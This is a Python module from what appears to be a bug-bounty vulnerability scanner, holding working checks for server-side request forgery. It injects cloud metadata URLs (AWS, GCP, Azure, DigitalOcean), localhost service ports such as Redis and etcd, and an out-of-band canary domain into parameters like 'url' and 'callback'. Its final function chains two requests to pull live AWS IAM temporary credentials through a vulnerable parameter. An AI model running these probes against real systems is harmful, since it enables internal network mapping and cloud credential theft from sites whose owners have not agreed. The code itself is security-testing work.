"""
SSRF checks: reflected/blind SSRF, cloud-metadata credential theft
(AWS/GCP/Azure/DigitalOcean), internal port scanning via SSRF.

Split out of the original monolithic detective.py - see detective/__init__.py
for the package-level docstring and full batch history.
"""

import asyncio
import base64
import hashlib
import hmac
import ipaddress
import json
import logging
import math
import os
import random
import re
import ssl
import struct
import time
import uuid
from collections import Counter
from urllib.parse import parse_qs, urlencode, urlparse, urlunparse

import httpx

from .. import oob, secret_verifier
from .shared import (
    logger,
    _TIMEOUT,
    _MAX_REASONABLE_URL_LENGTH,
    _extract_hostname,
    _looks_like_sane_url,
    _shannon_entropy,
    _replace_query_param,
)

_SSRF_PARAM_NAMES = ["url", "callback", "webhook", "next", "redirect", "target", "dest", "image", "src", "feed"]
_SSRF_INTERNAL_PROBES = [
    "http://169.254.169.254/latest/meta-data/",
    "http://localhost/",
    "http://127.0.0.1/",
]


async def check_ssrf_reflected(url: str) -> dict | None:
    """
    Non-blind SSRF only: tries common callback/fetch-style parameter names
    with an internal-looking target (cloud metadata IP, localhost) and
    checks whether the *response itself* comes back containing internal
    content (e.g. AWS metadata IAM/instance-id text). This deliberately
    skips blind/out-of-band SSRF detection - that needs a collaborator
    server you control and manual confirmation, which this pure-Python,
    no-infra check can't safely automate.

    Baseline-diffed against an unmodified request first - "instance-id"
    and similar phrases are specific, but not so specific that they can
    never appear on an unrelated page (an infra/inventory dashboard, for
    instance). Same false-positive lesson as check_ssti: don't trust a
    substring match without ruling out it was already there.
    """
    parsed = httpx.URL(url)
    if not parsed.query:
        return None

    existing_params = dict(parsed.params)
    try:
        async with httpx.AsyncClient(timeout=_TIMEOUT, verify=False, follow_redirects=True) as client:
            try:
                baseline_resp = await client.get(url)
                baseline_body = baseline_resp.text[:3000].lower()
            except httpx.HTTPError:
                return None

            for param_name in _SSRF_PARAM_NAMES:
                if param_name not in existing_params:
                    continue
                for probe in _SSRF_INTERNAL_PROBES:
                    test_params = dict(existing_params)
                    test_params[param_name] = probe
                    test_url = parsed.copy_with(params=test_params)
                    try:
                        resp = await client.get(test_url)
                    except httpx.HTTPError:
                        continue
                    body = resp.text[:3000].lower()
                    for sig in ("ami-id", "instance-id", "iam/security-credentials"):
                        if sig in body and sig not in baseline_body:
                            return {
                                "vuln_type": "ssrf_reflected_cloud_metadata",
                                "severity": "critical",
                                "evidence": (
                                    f"{test_url}: server-side fetch of parameter '{param_name}' "
                                    f"pointed at the cloud metadata endpoint and the response "
                                    f"body contains {sig!r} (absent from the unmodified baseline "
                                    f"response)."
                                ),
                            }
    except httpx.HTTPError as exc:
        logger.info("detective: SSRF check failed for %s: %s", url, exc)
    return None


async def check_ssrf_blind_oob(url: str, oob_domain: str, oob_proc, finding_tag: str) -> dict | None:
    """
    The blind-SSRF companion to check_ssrf_reflected above - this is the
    piece that check_ssrf_reflected's own docstring said this codebase
    couldn't do without a collaborator server (see oob.py). Instead of
    looking for internal content reflected back in the HTTP response
    (which most real SSRF never gives you), this sends the same
    callback/fetch-style parameters pointed at our own canary domain and
    waits to see if the TARGET SERVER makes an outbound DNS/HTTP request
    to it - proof the server-side fetch actually happened, independent
    of whatever the HTTP response looked like.

    oob_domain/oob_proc come from oob.start_session() - shared across a
    whole verify run, not created per-call. finding_tag is a short
    unique string (e.g. the finding id or a random suffix) embedded in
    the canary hostname so a shared session can attribute the callback
    to this specific test, not some other finding's.

    Returns None (not "unconfirmed") if oob_domain/oob_proc are None -
    that means OOB infra wasn't available this run at all, which is a
    different situation from "we tested and got no callback."
    """
    if not oob_domain or not oob_proc:
        return None

    parsed = httpx.URL(url)
    if not parsed.query:
        return None

    existing_params = dict(parsed.params)
    candidate_params = [p for p in _SSRF_PARAM_NAMES if p in existing_params]
    if not candidate_params:
        return None

    canary_host = f"{finding_tag}.{oob_domain}"
    tested_urls = []
    try:
        async with httpx.AsyncClient(timeout=_TIMEOUT, verify=False, follow_redirects=True) as client:
            for param_name in candidate_params:
                test_params = dict(existing_params)
                test_params[param_name] = f"http://{canary_host}/"
                test_url = parsed.copy_with(params=test_params)
                tested_urls.append(str(test_url))
                try:
                    await client.get(test_url)
                except httpx.HTTPError:
                    continue
    except httpx.HTTPError as exc:
        logger.info("detective: blind SSRF OOB probe failed for %s: %s", url, exc)
        return None

    if not tested_urls:
        return None

    interaction = await oob.wait_for_interaction(oob_proc, finding_tag)
    if interaction is None:
        return None  # no callback observed - genuinely inconclusive, not a finding

    protocol = interaction.get("protocol", "unknown")
    remote_addr = interaction.get("remote-address", "unknown")
    return {
        "vuln_type": "ssrf_blind_oob_confirmed",
        "severity": "critical",
        "evidence": (
            f"{url}: sent {canary_host} as a callback/fetch parameter value across "
            f"{len(tested_urls)} candidate param(s) ({', '.join(candidate_params)}), and the "
            f"target server itself made an out-of-band {protocol.upper()} request back to that "
            f"canary domain from {remote_addr} - confirmed server-side request forgery, proven "
            f"independent of anything in the HTTP response."
        ),
    }


_SSRF_INTERNAL_PORT_PROBES = [
    ("http://127.0.0.1:6379/", "redis"),
    ("http://127.0.0.1:9200/", "elasticsearch"),
    ("http://127.0.0.1:27017/", "mongodb"),
    ("http://127.0.0.1:2379/version", "etcd"),
    ("http://127.0.0.1:8500/v1/status/leader", "consul"),
]
_SSRF_SERVICE_BANNERS = {
    "redis": ["-ERR", "-NOAUTH", "-WRONGTYPE"],
    "elasticsearch": ['"cluster_name"', '"tagline" : "You Know, for Search"'],
    "mongodb": ["It looks like you are trying to access MongoDB"],
    "etcd": ["etcdcluster", '"etcdserver"'],
    "consul": ['"Leader"', "consul"],
}


async def check_ssrf_internal_port_scan(url: str) -> dict | None:
    """
    Same reflected-SSRF technique and parameter names as
    check_ssrf_reflected (batch 7), but probing common internal service
    ports (Redis, Elasticsearch, MongoDB, etcd, Consul) instead of the
    cloud metadata endpoint. If the app fetches these server-side and
    reflects the response, that's SSRF being used to fingerprint what's
    reachable on the internal network - a real, chainable finding even
    without cloud metadata being the target.

    Baseline-diffed against an unmodified request first, same discipline
    as the fixed check_ssrf_reflected - these banner strings are
    reasonably distinctive but not immune to coincidence without it.
    """
    parsed = httpx.URL(url)
    if not parsed.query:
        return None
    existing_params = dict(parsed.params)

    try:
        async with httpx.AsyncClient(timeout=_TIMEOUT, verify=False, follow_redirects=True) as client:
            try:
                baseline_resp = await client.get(url)
                baseline_body = baseline_resp.text[:3000]
            except httpx.HTTPError:
                return None

            for param_name in _SSRF_PARAM_NAMES:
                if param_name not in existing_params:
                    continue
                for probe_url, service in _SSRF_INTERNAL_PORT_PROBES:
                    test_params = dict(existing_params)
                    test_params[param_name] = probe_url
                    test_url = parsed.copy_with(params=test_params)
                    try:
                        resp = await client.get(test_url)
                    except httpx.HTTPError:
                        continue
                    body = resp.text[:3000]
                    for banner in _SSRF_SERVICE_BANNERS[service]:
                        if banner in body and banner not in baseline_body:
                            return {
                                "vuln_type": "ssrf_internal_service_fingerprinting",
                                "severity": "high",
                                "evidence": (
                                    f"{test_url}: server-side fetch of parameter '{param_name}' "
                                    f"pointed at {probe_url} and the response body contains a "
                                    f"{service} banner ({banner!r}, absent from baseline) - SSRF "
                                    f"confirmed reachable to an internal {service} instance."
                                ),
                            }
    except httpx.HTTPError as exc:
        logger.info("detective: SSRF internal port scan failed for %s: %s", url, exc)
    return None


async def check_ssrf_gcp_metadata(url: str) -> dict | None:
    """
    GCP's instance metadata endpoint requires a "Metadata-Flavor:
    Google" header on the REQUEST TO THE METADATA SERVER ITSELF - an
    app whose outbound SSRF-vulnerable fetch always sends that header
    (some HTTP client wrappers do, or a metadata-fetching helper
    function might) would be exploitable via GCP's path even though
    check_ssrf_reflected's generic AWS-style probes (which target
    169.254.169.254/latest/meta-data/ without that header) would miss
    it entirely. Baseline-diffed, same discipline as the fixed
    check_ssrf_reflected.
    """
    parsed = httpx.URL(url)
    if not parsed.query:
        return None
    existing_params = dict(parsed.params)

    try:
        async with httpx.AsyncClient(timeout=_TIMEOUT, verify=False, follow_redirects=True) as client:
            try:
                baseline_resp = await client.get(url)
                baseline_body = baseline_resp.text[:3000]
            except httpx.HTTPError:
                return None

            for param_name in _SSRF_PARAM_NAMES:
                if param_name not in existing_params:
                    continue
                test_params = dict(existing_params)
                test_params[param_name] = "http://169.254.169.254/computeMetadata/v1/instance/hostname"
                test_url = parsed.copy_with(params=test_params)
                try:
                    resp = await client.get(test_url)
                except httpx.HTTPError:
                    continue
                body = resp.text[:3000]
                if re.search(r"\.c\.[\w-]+\.internal", body) and body not in baseline_body:
                    return {
                        "vuln_type": "ssrf_gcp_metadata",
                        "severity": "critical",
                        "evidence": (
                            f"{test_url}: server-side fetch of parameter '{param_name}' "
                            f"pointed at the GCP metadata endpoint returned what looks like a "
                            f"GCE internal hostname (absent from baseline) - SSRF reaching "
                            f"GCP instance metadata, potentially including service account "
                            f"tokens via a follow-up path."
                        ),
                    }
    except httpx.HTTPError as exc:
        logger.info("detective: GCP metadata SSRF check failed for %s: %s", url, exc)
    return None


async def check_ssrf_azure_metadata(url: str) -> dict | None:
    """
    Azure's Instance Metadata Service similarly requires a "Metadata:
    true" header and a specific versioned path
    (/metadata/instance?api-version=...) - same reasoning as
    check_ssrf_gcp_metadata, this evades generic AWS-style probes.
    """
    parsed = httpx.URL(url)
    if not parsed.query:
        return None
    existing_params = dict(parsed.params)

    try:
        async with httpx.AsyncClient(timeout=_TIMEOUT, verify=False, follow_redirects=True) as client:
            try:
                baseline_resp = await client.get(url)
                baseline_body = baseline_resp.text[:3000]
            except httpx.HTTPError:
                return None

            for param_name in _SSRF_PARAM_NAMES:
                if param_name not in existing_params:
                    continue
                test_params = dict(existing_params)
                test_params[param_name] = (
                    "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
                )
                test_url = parsed.copy_with(params=test_params)
                try:
                    resp = await client.get(test_url)
                except httpx.HTTPError:
                    continue
                body = resp.text[:3000]
                if '"compute"' in body and '"compute"' not in baseline_body:
                    return {
                        "vuln_type": "ssrf_azure_metadata",
                        "severity": "critical",
                        "evidence": (
                            f"{test_url}: server-side fetch of parameter '{param_name}' "
                            f"pointed at Azure's IMDS endpoint returned a response containing "
                            f'\'"compute"\' (absent from baseline) - SSRF reaching Azure '
                            f"instance metadata."
                        ),
                    }
    except httpx.HTTPError as exc:
        logger.info("detective: Azure metadata SSRF check failed for %s: %s", url, exc)
    return None


async def check_ssrf_digitalocean_metadata(url: str) -> dict | None:
    """
    DigitalOcean's metadata endpoint needs no special header, but uses
    a distinct path (/metadata/v1.json) from the AWS-style
    /latest/meta-data/ path check_ssrf_reflected already probes - a
    signature-based WAF rule blocking the AWS-shaped path specifically
    wouldn't catch this variant.
    """
    parsed = httpx.URL(url)
    if not parsed.query:
        return None
    existing_params = dict(parsed.params)

    try:
        async with httpx.AsyncClient(timeout=_TIMEOUT, verify=False, follow_redirects=True) as client:
            try:
                baseline_resp = await client.get(url)
                baseline_body = baseline_resp.text[:3000]
            except httpx.HTTPError:
                return None

            for param_name in _SSRF_PARAM_NAMES:
                if param_name not in existing_params:
                    continue
                test_params = dict(existing_params)
                test_params[param_name] = "http://169.254.169.254/metadata/v1.json"
                test_url = parsed.copy_with(params=test_params)
                try:
                    resp = await client.get(test_url)
                except httpx.HTTPError:
                    continue
                body = resp.text[:3000]
                if '"droplet_id"' in body and '"droplet_id"' not in baseline_body:
                    return {
                        "vuln_type": "ssrf_digitalocean_metadata",
                        "severity": "critical",
                        "evidence": (
                            f"{test_url}: server-side fetch of parameter '{param_name}' "
                            f'pointed at DigitalOcean\'s metadata endpoint returned '
                            f'\'"droplet_id"\' (absent from baseline) - SSRF reaching '
                            f"DigitalOcean instance metadata."
                        ),
                    }
    except httpx.HTTPError as exc:
        logger.info("detective: DigitalOcean metadata SSRF check failed for %s: %s", url, exc)
    return None


_SSRF_IAM_ROLE_LIST_PROBES = [
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials",
]
_AWS_CRED_JSON_KEYS = ("AccessKeyId", "SecretAccessKey", "Token")


async def check_ssrf_metadata_credential_extraction(url: str) -> dict | None:
    """
    Complements check_ssrf_reflected (batch 7), which stops at the first
    sign of metadata content (an "instance-id"/"ami-id" string showing
    up). This chases the SAME confirmed SSRF two hops further, the way
    an attacker actually would: first requests the IAM role-list path to
    get a real role name back through the vulnerable parameter, then
    requests that exact role's credentials path through the same
    parameter. Only fires if the second response parses as JSON and
    contains all three AWS temporary-credential fields
    (AccessKeyId/SecretAccessKey/Token) - the difference between "this
    parameter can reach the metadata service" and "this parameter just
    handed over live cloud credentials", which is a categorically higher
    severity and a much harder Informative close for a program to make.
    Credential VALUES are only ever held in memory for the length of
    this evidence string - only the key name and a short prefix are
    included, never the full secret.
    """
    parsed = httpx.URL(url)
    if not parsed.query:
        return None
    existing_params = dict(parsed.params)

    try:
        async with httpx.AsyncClient(timeout=_TIMEOUT, verify=False, follow_redirects=True) as client:
            for param_name in _SSRF_PARAM_NAMES:
                if param_name not in existing_params:
                    continue

                role_name = None
                for role_list_probe in _SSRF_IAM_ROLE_LIST_PROBES:
                    test_params = dict(existing_params)
                    test_params[param_name] = role_list_probe
                    test_url = parsed.copy_with(params=test_params)
                    try:
                        resp = await client.get(test_url)
                    except httpx.HTTPError:
                        continue
                    candidate = resp.text.strip().splitlines()[0].strip() if resp.text.strip() else ""
                    if candidate and re.fullmatch(r"[A-Za-z0-9_+=,.@-]{1,128}", candidate):
                        role_name = candidate
                        break
                if not role_name:
                    continue

                cred_probe = (
                    f"http://169.254.169.254/latest/meta-data/iam/security-credentials/{role_name}"
                )
                test_params = dict(existing_params)
                test_params[param_name] = cred_probe
                test_url = parsed.copy_with(params=test_params)
                try:
                    cred_resp = await client.get(test_url)
                except httpx.HTTPError:
                    continue
                try:
                    cred_data = cred_resp.json()
                except ValueError:
                    continue
                if all(k in cred_data for k in _AWS_CRED_JSON_KEYS):
                    key_preview = str(cred_data["AccessKeyId"])[:8] + "…"
                    return {
                        "vuln_type": "ssrf_metadata_iam_credential_extraction",
                        "severity": "critical",
                        "evidence": (
                            f"{test_url}: chased the confirmed SSRF two hops - listed IAM role "
                            f"{role_name!r} via the metadata service, then retrieved that role's "
                            f"live temporary AWS credentials (AccessKeyId {key_preview}, plus a "
                            f"SecretAccessKey and session Token) through the same vulnerable "
                            f"parameter. Full cloud credential exfiltration confirmed, not just "
                            f"metadata-service reachability."
                        ),
                    }
    except httpx.HTTPError as exc:
        logger.info("detective: SSRF metadata credential extraction check failed for %s: %s", url, exc)
    return None


